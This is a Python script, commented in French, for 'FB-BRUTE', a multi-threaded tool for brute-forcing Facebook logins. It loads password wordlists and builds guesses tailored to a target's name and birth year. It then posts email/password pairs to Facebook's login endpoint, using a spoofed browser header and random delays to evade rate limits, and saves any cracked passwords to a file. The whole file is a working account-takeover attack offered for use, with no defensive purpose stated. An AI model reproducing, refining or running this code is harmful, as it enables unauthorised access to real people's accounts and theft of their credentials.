import time
import sys
import itertools
import string
import math
import random
import hashlib
import os
import glob
import threading
import concurrent.futures
from typing import Generator, List, Set
import requests

# ==================== AFFICHAGE FB-BRUTE STYLE ====================
class FB_BRUTE_Display:
    """Affichage style FB-BRUTE professionnel"""
    
    @staticmethod
    def print_banner():
        os.system('clear' if os.name == 'posix' else 'cls')
        print("""\033[92m
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║  ███████╗██████╗      ██████╗██████╗ ██╗   ██╗████████╗███████╗  ║
    ║  ██╔════╝██╔══██╗    ██╔════╝██╔══██╗██║   ██║╚══██╔══╝██╔════╝  ║
    ║  █████╗  ██████╔╝    ██║     ██████╔╝██║   ██║   ██║   █████╗    ║
    ║  ██╔══╝  ██╔══██╗    ██║     ██╔══██╗██║   ██║   ██║   ██╔══╝    ║
    ║  ██║     ██║  ██║    ╚██████╗██║  ██║╚██████╔╝   ██║   ███████╗  ║
    ║  ╚═╝     ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝  ║
    ║                                                                  ║
    ║          🅕 🅐 🅒 🅔 🅑 🅞 🅞 🅚   🅑 🅡 🅤 🅣 🅔   🅕 🅞 🅡 🅒 🅔          ║
    ║                                                                  ║
    ║              [Version 4.0 - ULTIMATE AI POWER PRO]               ║
    ║              [Multi-Target + Email + Phone + Links]              ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    \033[0m""")

    @staticmethod
    def print_loading(text):
        print(f"\033[96m[→]\033[0m \033[97m{text}\033[0m", end='', flush=True)
    
    @staticmethod
    def print_success(text):
        print(f"\033[92m[✓]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_error(text):
        print(f"\033[91m[✗]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_warning(text):
        print(f"\033[93m[!]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_info(text):
        print(f"\033[94m[i]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_attack(text):
        print(f"\033[91m[⚡]\033[0m \033[97m{text}\033[0m")
    
    @staticmethod
    def print_target(text):
        print(f"\033[95m[🎯]\033[0m \033[97m{text}\033[0m")

    @staticmethod
    def animate_text(text, delay=0.03):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()

    @staticmethod
    def progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r\033[94m{prefix}\033[0m |\033[92m{bar}\033[0m| {percent}% \033[94m{suffix}\033[0m', end='\r')
        if iteration == total:
            print()

# ==================== CONFIGURATION ULTRA-RAPIDE ====================
class FB_BRUTE_Config:
    MAX_THREADS = 12
    MAX_PASSWORD_LENGTH = 30
    MIN_PASSWORD_LENGTH = 1
    BATCH_SIZE = 1000
    REQUEST_DELAY = (0.03, 0.1)
    TIMEOUT = 8
    CHUNK_SIZE = 10000
    
    PRIORITY_FILES = [
        'passwords.txt', 'rockyou.txt', 'common_passwords.txt',
        'wordlist.txt', 'top_passwords.txt', 'french_passwords.txt'
    ]
    
    TARGET_TYPES = ['email', 'phone', 'username', 'profile_url']

# ==================== GESTIONNAIRE MULTI-CIBLES ====================
class MultiTargetManager:
    """Gestion des multiples cibles Facebook"""
    
    @staticmethod
    def detect_target_type(target):
        target = target.strip().lower()
        
        if '@' in target and '.' in target:
            return 'email'
        elif target.isdigit() and len(target) >= 9:
            return 'phone'
        elif 'facebook.com/' in target or 'fb.com/' in target:
            return 'profile_url'
        else:
            return 'username'

    @staticmethod
    def load_targets_from_file(filename):
        targets = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    target = line.strip()
                    if target:
                        target_type = MultiTargetManager.detect_target_type(target)
                        targets.append({'value': target, 'type': target_type})
            return targets
        except FileNotFoundError:
            return []

# ==================== GESTIONNAIRE DE FICHIERS DE MOTS DE PASSE ====================
class PasswordFileManager:
    """Gestion optimisée des fichiers de mots de passe"""
    
    @staticmethod
    def load_password_files():
        """Charge tous les fichiers de mots de passe disponibles"""
        all_passwords = set()
        loaded_files = 0
        
        for file_pattern in FB_BRUTE_Config.PRIORITY_FILES:
            if os.path.exists(file_pattern):
                try:
                    with open(file_pattern, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            password = line.strip()
                            if FB_BRUTE_Config.MIN_PASSWORD_LENGTH <= len(password) <= FB_BRUTE_Config.MAX_PASSWORD_LENGTH:
                                all_passwords.add(password)
                    loaded_files += 1
                    FB_BRUTE_Display.print_success(f"Loaded {file_pattern}")
                except Exception as e:
                    FB_BRUTE_Display.print_error(f"Error loading {file_pattern}: {e}")
        
        # Recherche d'autres fichiers .txt
        for txt_file in glob.glob("*.txt"):
            if txt_file not in FB_BRUTE_Config.PRIORITY_FILES:
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            password = line.strip()
                            if FB_BRUTE_Config.MIN_PASSWORD_LENGTH <= len(password) <= FB_BRUTE_Config.MAX_PASSWORD_LENGTH:
                                all_passwords.add(password)
                    loaded_files += 1
                    FB_BRUTE_Display.print_info(f"Loaded {txt_file}")
                except Exception:
                    pass
        
        return list(all_passwords), loaded_files

# ==================== GÉNÉRATEUR DE MOTS DE PASSE ULTIME ====================
class FB_BRUTE_Generator:
    """Générateur ultime optimisé pour FB-BRUTE"""
    
    def __init__(self, file_passwords, target_info=None):
        self.file_passwords = file_passwords
        self.target_info = target_info or {}
        self.generated_count = 0
        self.current_phase = 0
        
        self.phases = [
            "📂 Fichiers de Mots de Passe",
            "⚡ Patterns Ultra-Rapides", 
            "🔧 Combinaisons Intelligentes",
            "🧮 Algorithmes Mathématiques",
            "💥 Brute Force Massif"
        ]

    def generate_all_passwords(self) -> Generator[str, None, None]:
        """Génération complète sans limites"""
        
        # Phase 1: Mots de passe des fichiers
        self.current_phase = 1
        FB_BRUTE_Display.print_attack(f"PHASE 1: {self.phases[0]}")
        
        for pwd in self.file_passwords:
            self.generated_count += 1
            yield pwd
        
        # Phase 2: Patterns ultra-rapides
        self.current_phase = 2
        FB_BRUTE_Display.print_attack(f"PHASE 2: {self.phases[1]}")
        
        priority_passwords = self.generate_priority_passwords()
        for pwd in priority_passwords:
            self.generated_count += 1
            yield pwd
        
        # Phase 3: Combinaisons intelligentes
        self.current_phase = 3
        FB_BRUTE_Display.print_attack(f"PHASE 3: {self.phases[2]}")
        
        smart_combos = self.generate_smart_combinations()
        for pwd in smart_combos:
            self.generated_count += 1
            yield pwd
        
        # Phase 4: Algorithmes mathématiques
        self.current_phase = 4
        FB_BRUTE_Display.print_attack(f"PHASE 4: {self.phases[3]}")
        
        math_patterns = self.generate_mathematical_patterns()
        for pwd in math_patterns:
            self.generated_count += 1
            yield pwd
        
        # Phase 5: Brute force massif
        self.current_phase = 5
        FB_BRUTE_Display.print_attack(f"PHASE 5: {self.phases[4]}")
        
        brute_force = self.generate_massive_bruteforce()
        for pwd in brute_force:
            self.generated_count += 1
            yield pwd

    def generate_priority_passwords(self):
        """Mots de passe prioritaires pour résultats rapides"""
        priority = [
            '123456', 'password', '123456789', '12345678', '12345',
            '1234567', '1234567890', 'qwerty', 'abc123', 'password1',
            '1234', 'admin', 'hello', 'welcome', 'monkey', 'dragon',
            'sunshine', 'password123', 'admin123', 'welcome123',
            'facebook', 'facebook123', 'fbpassword', 'fb123456',
            'facebookpassword', 'fbpass', 'facebookpass',
            'storm', 'storm123', 'Storm123', 'STORM123', 'storm1234',
            'storm,1234', 'storm.1234', 'storm-1234'
        ]
        
        if self.target_info.get('name'):
            name = self.target_info['name'].lower()
            priority.extend([
                name, name + '123', name + '1234', name.capitalize() + '123',
                name + '!', name + '@123', name + '2024', name + '2023'
            ])
        
        if self.target_info.get('birth_year'):
            year = self.target_info['birth_year']
            priority.extend([year, year + '!', year + year])
        
        return priority

    def generate_smart_combinations(self):
        """Combinaisons intelligentes et ciblées"""
        base_words = ['storm', 'password', 'admin', 'facebook', 'user', 'login', 'secret', 'pass']
        
        if self.target_info.get('name'):
            base_words.append(self.target_info['name'].lower())
        
        for word in base_words:
            yield word
            yield word.upper()
            yield word.capitalize()
            
            # Leet speak
            leet_variations = [
                word.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0'),
                word.replace('s', '5').replace('t', '7'),
                word.replace('a', '@').replace('s', '$'),
                word.replace('o', '0').replace('i', '!')
            ]
            for leet in leet_variations:
                if leet != word:
                    yield leet
            
            # Suffixes numériques étendus
            for i in range(100000):
                yield f"{word}{i}"
                if i < 10000:
                    yield f"{word}{i:04d}"
                if i < 1000:
                    yield f"{word}{i:03d}"
                    yield f"{word}{i:02d}"
            
            # Séparateurs avancés
            separators = ['', '.', ',', '-', '_', '!', '@', '#', '$', '%', '&', '*']
            for sep in separators:
                for i in range(1000):
                    yield f"{word}{sep}{i}"
                    yield f"{i}{sep}{word}"
                    if i < 100:
                        yield f"{word}{sep}{i:02d}"
        
        # Combinaisons de mots
        for i in range(len(base_words)):
            for j in range(i + 1, len(base_words)):
                for sep in ['', '.', '-', '_']:
                    yield f"{base_words[i]}{sep}{base_words[j]}"
                    yield f"{base_words[j]}{sep}{base_words[i]}"

    def generate_mathematical_patterns(self):
        """Patterns mathématiques avancés"""
        # Fibonacci
        fib = [1, 1]
        while len(str(fib[-1])) <= 12:
            fib.append(fib[-1] + fib[-2])
            yield str(fib[-1])
        
        # Nombres premiers
        primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71]
        for prime in primes:
            yield str(prime)
        
        # Constantes mathématiques
        constants = ['314159', '271828', '161803', '141421', '577215', '662607', '866025']
        for constant in constants:
            yield constant
            yield constant[:4]
            yield constant[:6]

    def generate_massive_bruteforce(self):
        """Brute force massif optimisé"""
        # Caractères simples d'abord
        simple_charset = string.ascii_lowercase + string.digits
        advanced_charset = simple_charset + '!@#$%'
        
        # Longueurs 4-6 (plus probables)
        for length in range(4, 7):
            for _ in range(15000):
                yield ''.join(random.choices(simple_charset, k=length))
        
        # Longueurs 7-8 avec caractères spéciaux
        for length in range(7, 9):
            for _ in range(5000):
                yield ''.join(random.choices(advanced_charset, k=length))

# ==================== MOTEUR FB-BRUTE MULTI-THREAD ====================
class FB_BRUTE_Engine:
    """Moteur principal FB-BRUTE ultra-rapide"""
    
    def __init__(self):
        self.found = False
        self.found_password = None
        self.found_target = None
        self.attempts = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.consecutive_errors = 0
        
        self.session_pool = [requests.Session() for _ in range(FB_BRUTE_Config.MAX_THREADS)]
        for session in self.session_pool:
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            })

    def try_password_batch(self, target, password_batch, thread_id):
        """Tente un lot de mots de passe"""
        if self.found:
            return
            
        session = self.session_pool[thread_id % len(self.session_pool)]
        
        for password in password_batch:
            if self.found:
                return
                
            with self.lock:
                self.attempts += 1
            
            # Délai adaptatif
            delay = random.uniform(*FB_BRUTE_Config.REQUEST_DELAY)
            if self.consecutive_errors > 5:
                delay *= 2
            time.sleep(delay)
            
            try:
                response = session.post(
                    'https://www.facebook.com/login.php',
                    data={
                        'email': target['value'], 
                        'pass': password, 
                        'login': 'Log In'
                    },
                    allow_redirects=True,
                    timeout=FB_BRUTE_Config.TIMEOUT
                )
                
                # Réinitialiser les erreurs en cas de succès
                self.consecutive_errors = 0
                
                # Détection robuste améliorée
                success_indicators = [
                    'Find Friends', 'Two-factor authentication', 'home_main',
                    'newsfeed', 'fbDTSG', 'userNav', 'bookmarks', 'groups',
                    'watch', 'marketplace', 'friends', 'messages'
                ]
                
                failure_indicators = [
                    'The password that you\'ve entered is incorrect',
                    'Invalid username or password',
                    'Log Into Facebook'
                ]
                
                # Vérifier le succès
                if any(indicator in response.text for indicator in success_indicators):
                    if not any(failure in response.text for failure in failure_indicators):
                        with self.lock:
                            if not self.found:
                                self.found = True
                                self.found_password = password
                                self.found_target = target
                        return
                
                # Vérification par URL
                if 'facebook.com/home' in response.url or '/checkpoint/' in response.url:
                    with self.lock:
                        if not self.found:
                            self.found = True
                            self.found_password = password
                            self.found_target = target
                    return
                    
            except requests.exceptions.ConnectionError:
                with self.lock:
                    self.consecutive_errors += 1
            except requests.exceptions.Timeout:
                with self.lock:
                    self.consecutive_errors += 1
            except Exception as e:
                with self.lock:
                    self.consecutive_errors += 1
                    if "429" in str(e) or "Too Many Requests" in str(e):
                        time.sleep(60)  # Wait 1 minute for rate limit

    def attack_single_target(self, target, password_generator):
        """Attaque une cible unique"""
        print(f"\n\033[95m[🎯] Attacking: {target['value']} ({target['type']})\033[0m")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=FB_BRUTE_Config.MAX_THREADS) as executor:
            futures = []
            password_batch = []
            batch_count = 0
            
            for password in password_generator:
                if self.found:
                    break
                    
                password_batch.append(password)
                
                if len(password_batch) >= FB_BRUTE_Config.BATCH_SIZE:
                    future = executor.submit(self.try_password_batch, target, password_batch.copy(), len(futures))
                    futures.append(future)
                    password_batch = []
                    batch_count += 1
                    
                    # Nettoyer les futures complétés
                    if len(futures) >= FB_BRUTE_Config.MAX_THREADS * 2:
                        completed = [f for f in futures if f.done()]
                        for f in completed:
                            futures.remove(f)
            
            # Dernier lot
            if password_batch and not self.found:
                executor.submit(self.try_password_batch, target, password_batch, len(futures))
            
            # Attendre la completion
            concurrent.futures.wait(futures)
        
        return self.found_password

# ==================== PROGRAMME PRINCIPAL FB-BRUTE ====================
def main():
    FB_BRUTE_Display.print_banner()
    
    # Animation de démarrage
    FB_BRUTE_Display.animate_text("\033[91mInitializing FB-BRUTE Ultimate System...\033[0m")
    time.sleep(0.3)
    
    FB_BRUTE_Display.animate_text("\033[93mLoading AI-Powered Brute Force Engine...\033[0m")
    time.sleep(0.3)
    
    FB_BRUTE_Display.animate_text("\033[92mActivating Multi-Threading Attack Mode...\033[0m")
    time.sleep(0.3)
    
    print("\n" + "="*70)
    
    # Choix du mode d'attaque
    print("\033[96m[?] Select attack mode:\033[0m")
    print("  1. Single Target")
    print("  2. Multiple Targets from file")
    
    choice = input("\033[96m[?] Choice (1-2): \033[92m").strip()
    print("\033[0m", end="")
    
    targets = []
    
    if choice == "1":
        target_input = input("\033[96m[?] Enter target (email/phone/username/URL): \033[92m").strip()
        print("\033[0m", end="")
        
        if not target_input:
            FB_BRUTE_Display.print_error("No target provided!")
            return
            
        target_type = MultiTargetManager.detect_target_type(target_input)
        targets.append({'value': target_input, 'type': target_type})
        
    elif choice == "2":
        target_file = input("\033[96m[?] Enter targets file: \033[92m").strip()
        print("\033[0m", end="")
        
        if not target_file:
            FB_BRUTE_Display.print_error("No targets file provided!")
            return
            
        targets = MultiTargetManager.load_targets_from_file(target_file)
        if not targets:
            FB_BRUTE_Display.print_error("No targets found in file!")
            return
        
        FB_BRUTE_Display.print_success(f"Loaded {len(targets)} targets")
    
    else:
        FB_BRUTE_Display.print_error("Invalid choice!")
        return
    
    # Chargement des mots de passe
    FB_BRUTE_Display.print_info("Loading password files...")
    all_passwords, files_loaded = PasswordFileManager.load_password_files()
    
    if not all_passwords:
        FB_BRUTE_Display.print_error("No passwords loaded! Please add password files.")
        return
    
    FB_BRUTE_Display.print_success(f"Loaded {len(all_passwords):,} passwords from {files_loaded} files")
    
    # Informations cible optionnelles
    target_info = {}
    use_advanced = input("\033[96m[?] Use advanced targeting? (y/n): \033[92m").strip().lower()
    print("\033[0m", end="")
    
    if use_advanced == 'y':
        target_info['name'] = input("\033[96m[?] Target name: \033[92m").strip()
        target_info['birth_year'] = input("\033[96m[?] Birth year: \033[92m").strip()
        print("\033[0m", end="")

    # Lancement des attaques
    print("\n" + "="*70)
    FB_BRUTE_Display.print_attack("STARTING FB-BRUTE ULTIMATE ATTACK!")
    FB_BRUTE_Display.print_info(f"Threads: {FB_BRUTE_Config.MAX_THREADS} | Targets: {len(targets)} | Passwords: {len(all_passwords):,}")
    print("="*70)
    
    overall_start = time.time()
    successful_cracks = 0
    results = []

    for i, target in enumerate(targets, 1):
        if successful_cracks >= 1 and len(targets) > 1:
            FB_BRUTE_Display.print_info("Stopping after first successful crack in multi-target mode")
            break
            
        FB_BRUTE_Display.print_target(f"Target {i}/{len(targets)}: {target['value']}")
        
        # Réinitialiser le moteur pour chaque cible
        engine = FB_BRUTE_Engine()
        generator = FB_BRUTE_Generator(all_passwords, target_info)
        
        # Thread de statistiques en temps réel
        stats_running = True
        
        def live_stats():
            while stats_running and not engine.found and engine.attempts < 5000000:
                elapsed = time.time() - engine.start_time
                speed = engine.attempts / elapsed if elapsed > 0 else 0
                phase_info = generator.phases[generator.current_phase - 1] if generator.current_phase > 0 else "Starting..."
                print(f"\r\033[94m[🚀] {phase_info} | Attempts: {engine.attempts:,} | Speed: {speed:.0f}/sec | Elapsed: {elapsed:.1f}s\033[0m", end='', flush=True)
                time.sleep(0.5)
        
        stats_thread = threading.Thread(target=live_stats, daemon=True)
        stats_thread.start()
        
        # Lancer l'attaque
        try:
            result = engine.attack_single_target(target, generator.generate_all_passwords())
        except KeyboardInterrupt:
            FB_BRUTE_Display.print_warning("Attack interrupted by user")
            result = None
        except Exception as e:
            FB_BRUTE_Display.print_error(f"Attack error: {e}")
            result = None
        
        # Arrêter les statistiques
        stats_running = False
        stats_thread.join(timeout=1)
        
        # Afficher les résultats
        print("\n" + "-"*50)
        if result:
            successful_cracks += 1
            FB_BRUTE_Display.animate_text("\033[92m[💥 CRACK SUCCESSFUL!]\033[0m")
            print(f"\033[92m[✓] Target: {target['value']}\033[0m")
            print(f"\033[92m[✓] Password: {result}\033[0m")
            print(f"\033[94m[i] Statistics:\033[0m")
            print(f"   • Attempts: {engine.attempts:,}")
            print(f"   • Time: {time.time() - engine.start_time:.2f}s")
            print(f"   • Speed: {engine.attempts/(time.time()-engine.start_time):.0f} pwd/sec")
            print(f"   • Phase: {generator.phases[generator.current_phase - 1]}")
            
            # Sauvegarder le résultat
            results.append({
                'target': target['value'],
                'password': result,
                'attempts': engine.attempts,
                'time': time.time() - engine.start_time
            })
        else:
            FB_BRUTE_Display.print_error(f"Password not found for {target['value']}")
            print(f"\033[93m[i] Attempted {engine.attempts:,} passwords\033[0m")
            print(f"\033[93m[i] Reached phase: {generator.phases[generator.current_phase - 1]}\033[0m")
        
        print("-"*50)
        time.sleep(1)  # Pause entre les cibles

    # Résumé final
    print("\n" + "="*70)
    total_time = time.time() - overall_start
    
    if successful_cracks > 0:
        FB_BRUTE_Display.animate_text(f"\033[92m[🎉 MISSION ACCOMPLISHED!] {successful_cracks}/{len(targets)} targets cracked\033[0m")
        print(f"\033[92m[📊] SUCCESSFUL CRACKS:\033[0m")
        for i, result in enumerate(results, 1):
            print(f"   {i}. {result['target']} → {result['password']} (in {result['time']:.1f}s)")
    else:
        FB_BRUTE_Display.print_error(f"[💔 MISSION FAILED] 0/{len(targets)} targets cracked")
    
    print(f"\033[94m[i] Total execution time: {total_time:.2f}s\033[0m")
    print(f"\033[94m[i] FB-BRUTE Ultimate - Operation Complete\033[0m")
    print("="*70)
    
    # Sauvegarder les résultats dans un fichier
    if results:
        try:
            with open('fb_brute_results.txt', 'w', encoding='utf-8') as f:
                f.write("FB-BRUTE Results\n")
                f.write("================\n\n")
                for result in results:
                    f.write(f"Target: {result['target']}\n")
                    f.write(f"Password: {result['password']}\n")
                    f.write(f"Attempts: {result['attempts']}\n")
                    f.write(f"Time: {result['time']:.2f}s\n")
                    f.write("-" * 40 + "\n")
            FB_BRUTE_Display.print_success("Results saved to fb_brute_results.txt")
        except Exception as e:
            FB_BRUTE_Display.print_error(f"Could not save results: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[91m[!] FB-BRUTE interrupted by user\033[0m")
    except Exception as e:
        print(f"\n\033[91m[!] FB-BRUTE error: {e}\033[0m")